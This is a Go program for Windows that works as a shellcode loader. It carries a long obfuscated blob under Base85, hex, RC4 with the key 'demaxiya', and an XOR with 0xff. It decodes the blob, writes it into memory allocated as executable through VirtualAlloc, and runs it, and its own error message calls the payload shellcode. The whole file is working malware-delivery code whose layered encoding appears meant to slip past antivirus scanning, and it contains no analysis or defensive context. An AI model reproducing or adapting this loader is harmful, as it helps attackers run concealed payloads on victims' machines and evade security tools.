package main

import (
	"crypto/rc4"
	"encoding/hex"
	"fmt"
	"syscall"
	"unsafe"

	"github.com/eknkc/basex"
	"github.com/gonutz/ide/w32"
)

const (
	memCommit            = 0x00001000
	memReserve           = 0x00002000
	pageExecute          = 0x10
	pageExecuteRead      = 0x20
	pageExecuteReadWrite = 0x40
	pageExecuteWrite     = 0x80
	memRelease           = 0x8000
)

func main() {
	key := []byte("demaxiya")
	encodedMessage := "1m>R;_Qw{V848K~VEqn3&sCJRkgqX??C(rZ_lqz`doJHOm^HCt@#cws-*}%G)QTcSV#vN4H%H@aE7r9D&Cp&aV^9W4W8=pSid2|ahs_!B+mpnGD${WmV_7`-2rG97Oy;?;+MhCfp3Ti^|`ea5haU}s>L2PP%Gl(06$HYz^L-0hFXZZQFbvk%z`Z<T=u|n=1$T716F$A8DC_yd0Pi-GKvk9+q0E#lX=$>@3LHQox}gF)0w{p`1k{VO(s8*!YLo?+@=9LIYVLC5y$0xtr>nXEJ01603ZkG{3BUy0j=9<t7Jy%W)pQH^&4>r;qP4GD9~M<5G8RqS?^VKxCohYogWJyNMR<fS~OB>%+VN%E41ROe-=R<2oV6376v&4TR&_Wpln56xndANWM^7sF`Nc7r3<sOxJ!3{Xz6%p2h0e=Pj1U_{MPZS$VO>NvLvY}gn~-^Q20_B9)|A+$b`JEQJ8%{S7QmEr0|3P>W)7LZD`0$8^z{~517tYLy`6p<B&erfqeUnwm~`|!Yfs(5|n`iPj8_4Du3Og;bgM+tPqh~hl%9oc|Kd5KJJfvc>t`ULrg(tR-{cr|Ei}0pff8|za?t}+=Y82G63^9O>)`^+Y2NDmd@y?X%?0H%!?3QbvH!0AXw4jmjGYyl`6}VpshA(X%?)5ii3UhMEMUi|tr~j4TXz5crkyH|(4E)ub!=ha;m_GO{>`oE7?%MGA#mSygOS2UtamLFQsX*<!CL%FDpunI+&wm5tM8=5zvK}=V53)6i6a#ZQB&1V(Z*$PWN9UwEL25gUZQ-nXlPqauhL&NQ3$9O@Gg*!9_)0DLpO!R4u!r^t^_PdXo!_gs7d?sbi`~c7GHZ_G=yK68b%+<u8YsAS1j*9K{8l)iz+D&L!y&(Z6+U7Ga#T-~L5Iurfu$57)?j(Wo6dkSfF!*A^UR2UJXL{@s8Q?FA+i0^)iPZ3S9Vf(&m^6&k6$-(V~!?7vN_(G-1yagSlK_y+9SHjkgvV6hl`<AKfyLkdk<cv09~+MT-F5wbu1=N6GD3UyAg4T5=k<2J`kAD;Fh#%A0M%N9s7`re22BoM?a=|3V6rPGgRN;JhcI1X2&DgAgm^5&jC>0+?sOze`UB6=4z|V+uDFZ?wGnT5Z-3exSgq66}Yg7=LC>NLS;W)vrwTOHBTwGq=pc%(3JV+fKw?lg01aK_}{I-Rr$8p*B56C+PC13+HLl_~BZ)zK!#QCWyKy2+IRc(ilxWO+A3-RzFQ*|i1~zswCRfNwT}z$WB!inq5ym@}#UfFHC9AuI28i>sUVqL=F{YHp6I#N<&<u1;C^cAd}ox~?OyPo(6XzBd(RKuh@FBV!}F&?`!J-t_)kFh+|IU31Y~Vj4H^3wU|@-$ln+Bky&o|{weK)}_gz1}@DT5b#Qzfg)qHsP^2Q`y&gn5Xa>_@v#LEvTi51gohMDwu<StcrPT_*HT<x~QGLRvd=E}+rgoK2(L^mP#O52rBGQe&A=LHC+~T9&&>Pter6Z!DWnB&62BO0+ZaG6!r`s)7G}hnoK0GvvRdMqh3weL8FNB3VCk9Sw~_l@q95+qC^(6Za)c5bs&2x&bBYAJ6_EWI0n>^mE7;)DFJzEavd6C=puJ~A-nLoAf=NE0%uY16tU3|*Et*8^_p{Ttr-yXIToMzOm?S!FSS0&(O!0))^KPY#+f(~BfwW#LWB);w$+t{O$l+dHm1~?!QWzI!SnOYgA7l)MPT6dmTE;1_IH0~m8U5d3$uSEb3P0Ha;C{JFG4ZQJ`REi`XNDBOS`IbIX9iNQE1G*CD`D&{4L$_`o>}3#Vb2YShMbISATyN!As1=vY0T|_(}%`!t(W=t+M=)GWVBWf<G?#vi&I87%eB(<ezb(@~mIWe1X{&<Y2!;r*W3VEwGuvDe<QTVE_J?pTQF_S0x&=Qcu$9-b(DUYQ6o>SFh8W61E9tM7RA7g;HIlW6FTx~i0|Q_{E~P(#hi{m;Qf!2W%bzm9tg#;BR940%p#T|*j)#r>!1900Dr#!vxJjEkrgp"

	// Base85 解码
	base85, _ := basex.NewEncoding("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~")
	hexCiphertext, _ := base85.Decode(encodedMessage)

	// 转为二进制
	rc4Message := make([]byte, hex.DecodedLen(len(hexCiphertext)))
	n, _ := hex.Decode(rc4Message, hexCiphertext)
	rc4Message = rc4Message[:n]

	// RC4 解密
	cipher, _ := rc4.NewCipher(key)
	xordMessage := make([]byte, len(rc4Message))
	cipher.XORKeyStream(xordMessage, rc4Message)

	// XOR 操作
	message := make([]byte, len(xordMessage))
	for i := 0; i < len(xordMessage); i++ {
		message[i] = xordMessage[i] ^ 0xff
	}

	kernel32, _ := syscall.LoadLibrary("kernel32.dll")
	VirtualAlloc, _ := syscall.GetProcAddress(kernel32, "VirtualAlloc")
	VirtualFree, _ := syscall.GetProcAddress(kernel32, "VirtualFree")

	// 分配内存并写入解密后的二进制数据
	allocSize := uintptr(len(message))
	mem, _, err := syscall.Syscall6(uintptr(VirtualAlloc), 4, 0, allocSize, memCommit|memReserve, pageExecuteReadWrite, 0, 0)
	if err != 0 {
		panic(fmt.Sprintf("VirtualAlloc failed with error code %d", err))
	}
	buffer := (*[1 << 30]byte)(unsafe.Pointer(mem))[:allocSize:allocSize]
	copy(buffer, message)

	// 执行解密后的二进制数据
	_, _, err = syscall.Syscall(uintptr(mem), 0, 0, 0, 0)
	if err != 0 {
		panic(fmt.Sprintf("Failed to execute shellcode with error code %d", err))
	}

	// 释放内存
	_, _, err = syscall.Syscall6(uintptr(VirtualFree), 3, mem, 0, memRelease, 0, 0, 0)
	if err != 0 {
		panic(fmt.Sprintf("Failed to release memory with error code %d", err))
	}
}
